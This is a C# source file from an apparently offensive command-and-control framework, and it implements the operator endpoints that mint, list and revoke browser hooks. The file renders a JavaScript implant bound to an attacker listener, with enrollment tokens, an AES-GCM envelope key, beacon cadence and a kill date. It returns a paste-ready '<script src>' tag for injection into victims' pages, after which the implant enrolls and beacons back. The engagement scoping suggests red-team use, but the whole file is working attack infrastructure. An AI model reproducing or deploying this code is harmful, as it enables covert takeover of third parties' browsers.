using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Routing;
using Rod.Audit;
using Rod.BuildPipeline.PayloadBuild;
using Rod.CoreState;
using Rod.CoreState.Engagements;
using Rod.CoreState.Deployment;
using Rod.CoreState.Implants;
using Rod.CoreState.Operators;
using Rod.Transport.Hooks;
using Rod.Transport.Listeners;
using Rod.Transport.Payloads;
using ClaimsPrincipal = System.Security.Claims.ClaimsPrincipal;

namespace Rod.Transport.Endpoints;

// The browser-hook mint and its roster (architecture.md Sec 5.2, Sec 8):
// the operator surface that renders the hook asset module's script with a
// bake -- credential, seal, cadence, verbs -- stores it as a served payload
// record, and answers the `<script src>` URL a script-injection foothold
// loads. The serving half (the public route a victim's browser fetches)
// lives in HookServingEndpoints on the implant family.
//
// The mint deliberately does not ride the external build contract: the hook
// is a rendered script, not a compiled artifact, so the web-shell
// generator's pattern applies (render, fingerprint, store) with the
// deploy-token and envelope-key minting a payload build carries. The
// template itself is module-layer content (Sec 15.1): modules/browserhook
// in-tree, any directory the operator lists under
// Capabilities:AssetModules at a deployment.

/// <summary>
/// Maps the engagement's browser-hook endpoints: mint, list, and revoke.
/// </summary>
public static class HookEndpoints
{
    public static IEndpointRouteBuilder MapHookEndpoints(this IEndpointRouteBuilder endpoints)
    {
        var group = endpoints.MapGroup("/engagements/{engagementId}/hooks");

        group.MapPost("/", MintHookAsync).AddEndpointFilter(new EngagementAccessFilter(EngagementAccessRequirement.Write))
            .WithName(nameof(MintHookAsync));
        group.MapGet("/", ListHooksAsync).AddEndpointFilter(new EngagementAccessFilter(EngagementAccessRequirement.Read))
            .WithName(nameof(ListHooksAsync));
        group.MapDelete("/{hookId}", RevokeHookAsync).AddEndpointFilter(new EngagementAccessFilter(EngagementAccessRequirement.Write))
            .WithName(nameof(RevokeHookAsync));

        return endpoints;
    }

    // The default enrollment budget: a mint names its own via tokenMaxUses,
    // and zero is unlimited -- every hooked browser spends one use, so the
    // number is the engagement's estimate of touched browsers (reloads in a
    // storage-blocked context spend one each, architecture.md Sec 5.2).
    private const int DefaultTokenMaxUses = 50;

    private static async Task<IResult> MintHookAsync(
        string engagementId,
        MintHookRequest body,
        ClaimsPrincipal user,
        IEngagementRepository engagements,
        IListenerRegistry listeners,
        IDeployTokenService tokens,
        IPayloadStore payloads,
        IAuditStore audit,
        Rod.CoreState.Assets.IModuleAssetStore assets,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return Results.BadRequest(new Problem("Engagement id is not a valid identifier."));
        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();

        var engagementRow = await engagements.FindAsync(engagement, cancellationToken);
        if (engagementRow is null)
            return Results.NotFound(new Problem("Engagement does not exist."));
        if (engagementRow.IsClosed)
            return Results.Conflict(new Problem("The engagement is closed to new deployments."));

        // The hook rides the web family only: its client is fetch(), its
        // front the same http(s) listener the envelope carrier serves.
        if (!ListenerId.TryParse(body.ListenerId, out var listenerId))
            return Results.BadRequest(new Problem("Listener id is not a valid identifier."));
        var listener = await listeners.FindAsync(listenerId, cancellationToken);
        if (listener is null || listener.EngagementId != engagement)
            return Results.BadRequest(new Problem("Listener does not serve this engagement."));
        if (listener.Transport is not ("http" or "https"))
            return Results.BadRequest(new Problem("The browser hook rides the web family; name an http or https listener."));

        // The template is module-layer content (Sec 15.1) and refuses loudly
        // when no module carries it: the answer names the config section,
        // because deploying and listing the module is the whole fix. Nothing
        // is minted before the check -- no token budget spent on a mint that
        // cannot render.
        if (!assets.TryRead(BrowserHookScript.TemplateModuleName, BrowserHookScript.TemplateAssetName, out var template))
            return Results.Problem(
                title: $"No '{BrowserHookScript.TemplateModuleName}' asset module is loaded; deploy one and list its directory under Capabilities:AssetModules.",
                statusCode: StatusCodes.Status503ServiceUnavailable);

        // The seal posture: the mainstream mint bakes the per-hook envelope
        // key (sealed enroll and contacts, the response GCM tag as server
        // authentication); "none" renders the cleartext posture for hooking
        // plain-http pages where crypto.subtle is unavailable.
        var sealedPosture = !string.Equals(body.Envelope?.Trim(), "none", StringComparison.OrdinalIgnoreCase);
        if (body.Envelope is not null && sealedPosture
            && !string.Equals(body.Envelope.Trim(), "aesgcm", StringComparison.OrdinalIgnoreCase))
        {
            return Results.BadRequest(new Problem("Envelope must be 'aesgcm' (the default) or 'none'."));
        }

        var at = clock.GetUtcNow();
        var sleep = body.SleepSeconds is > 0 and <= 3600 ? body.SleepSeconds.Value : 30;
        var jitter = body.JitterSeconds is >= 0 and <= 600 ? body.JitterSeconds.Value : 5;
        // A pinned fuse in the past is a hook that could never contact; the
        // build contract refuses the same shape, so the mint does too.
        if (body.KillDate is { } pinned && pinned <= at)
            return Results.BadRequest(new Problem("KillDate must be in the future; leave it empty for an open-ended hook."));
        var killDate = PayloadBuildService.ResolveKillDate(at, body.KillDate);
        var maxUses = body.TokenMaxUses is >= 0 ? body.TokenMaxUses.Value : DefaultTokenMaxUses;

        var token = await tokens.MintAsync(
            engagement, engagementRow.OwnerId, at,
            maxUses: maxUses,
            lifetime: killDate - at ?? TimeSpan.FromDays(30),
            cancellationToken: cancellationToken);

        var (keyId, key) = AesGcmEnvelope.Mint();
        var bakedKey = sealedPosture ? AesGcmEnvelope.Bake(keyId, key) : null;

        var endpoint = listener.PublicEndpoint.TrimEnd('/');
        var content = BrowserHookScript.Render(template.Content, new BrowserHookBake(
            $"{endpoint}/implants/enroll",
            $"{endpoint}/implants/beacon",
            token.Secret,
            bakedKey,
            ImplantClassCapabilities.For(ImplantClass.Browser),
            sleep,
            jitter,
            killDate?.ToString("O")));
        var fingerprint = ArtifactFingerprint.Of(content);
        var hookId = Guid.NewGuid();

        await payloads.SaveAsync(
            new PayloadRecord(
                hookId,
                engagement.Value,
                "Browser",
                "javascript",
                "application/javascript",
                fingerprint,
                content,
                content.Length,
                at,
                Endpoint: listener.PublicEndpoint,
                TokenId: token.Id.Value,
                EnvelopeKeyId: sealedPosture ? keyId : null,
                EnvelopeKey: sealedPosture ? key : null,
                Build: new PayloadBuildProfile
                {
                    Mode = "poll",
                    SleepSeconds = sleep,
                    JitterSeconds = jitter,
                    KillDate = killDate,
                    Envelope = sealedPosture ? "aesgcm" : "none",
                }),
            cancellationToken);

        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: engagement.Value,
                operatorId: operatorId.Value.Value,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "mint-hook",
                kind: AuditEventKind.HookMinted,
                payload: $"listener={listener.Name} envelope={(sealedPosture ? "aesgcm" : "none")} "
                    + $"sleep={sleep}s jitter={jitter}s uses={(maxUses == 0 ? "unlimited" : maxUses)}",
                output: null,
                outcome: hookId.ToString("N"),
                at),
            cancellationToken);

        var url = $"{endpoint}/implants/hooks/{hookId:N}";
        return Results.Ok(new MintHookResponse(
            hookId.ToString("N"),
            url,
            $"<script src=\"{url}\"></script>",
            $"{url}/page",
            listener.Name,
            sealedPosture ? "aesgcm" : "none",
            sleep,
            jitter,
            maxUses,
            fingerprint));
    }

    private static async Task<IResult> ListHooksAsync(
        string engagementId,
        IPayloadStore payloads,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return Results.BadRequest(new Problem("Engagement id is not a valid identifier."));

        // The hook roster is the payload library read through the Browser
        // class lens: every stored record of that class is a minted hook.
        var records = await payloads.ListAsync(engagement.Value, cancellationToken);
        var hooks = records
            .Where(r => string.Equals(r.Class, "Browser", StringComparison.OrdinalIgnoreCase))
            .OrderByDescending(r => r.BuiltAt)
            .Select(r => new HookResponse(
                r.PayloadId.ToString("N"),
                $"{r.Endpoint?.TrimEnd('/')}/implants/hooks/{r.PayloadId:N}",
                r.Endpoint,
                r.Build?.Envelope,
                r.Build?.SleepSeconds,
                r.Build?.JitterSeconds,
                r.BuiltAt,
                r.Fingerprint))
            .ToArray();
        return Results.Ok(hooks);
    }

    private static async Task<IResult> RevokeHookAsync(
        string engagementId,
        string hookId,
        ClaimsPrincipal user,
        IPayloadStore payloads,
        IDeployTokenService tokens,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        if (!EngagementId.TryParse(engagementId, out var engagement))
            return Results.BadRequest(new Problem("Engagement id is not a valid identifier."));
        var operatorId = user.TryGetOperatorId();
        if (operatorId is null)
            return Results.Unauthorized();
        if (!Guid.TryParse(hookId, out var hookValue))
            return Results.BadRequest(new Problem("Hook id is not a valid identifier."));

        var record = await payloads.FindAsync(hookValue, engagement.Value, cancellationToken);
        if (record is null || !string.Equals(record.Class, "Browser", StringComparison.OrdinalIgnoreCase))
            return Results.NotFound(new Problem("Hook does not exist in this engagement."));

        // Removing the record stops the serving route (it 404s from now on)
        // and takes the envelope key with it -- the stored pair dies together
        // -- while revoking the token turns any already-fetched copy of the
        // script into a credential that enrolls nothing.
        await payloads.RemoveAsync(hookValue, engagement.Value, cancellationToken);
        if (record.TokenId is { } tokenId)
            await tokens.RevokeAsync(new DeployTokenId(tokenId), cancellationToken);

        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: engagement.Value,
                operatorId: operatorId.Value.Value,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "revoke-hook",
                kind: AuditEventKind.PayloadDeleted,
                payload: $"class=Browser endpoint={record.Endpoint}",
                output: null,
                outcome: record.Fingerprint,
                at: clock.GetUtcNow()),
            cancellationToken);
        return Results.NoContent();
    }
}

/// <summary>
/// The mint's request body: which listener fronts the hook, the contact
/// cadence, the seal posture, the enrollment budget, and the optional time
/// fuse.
/// </summary>
public sealed record MintHookRequest(
    string? ListenerId,
    double? SleepSeconds = null,
    double? JitterSeconds = null,
    string? Envelope = null,
    int? TokenMaxUses = null,
    DateTimeOffset? KillDate = null);

/// <summary>The mint's answer: the serving URL, the paste-ready snippet, and the mint's shape.</summary>
public sealed record MintHookResponse(
    string HookId,
    string Url,
    string Snippet,
    string TestPageUrl,
    string ListenerName,
    string Envelope,
    double SleepSeconds,
    double JitterSeconds,
    int TokenMaxUses,
    string Fingerprint);

/// <summary>One row of the hook roster.</summary>
public sealed record HookResponse(
    string HookId,
    string Url,
    string? Endpoint,
    string? Envelope,
    double? SleepSeconds,
    double? JitterSeconds,
    DateTimeOffset BuiltAt,
    string Fingerprint);
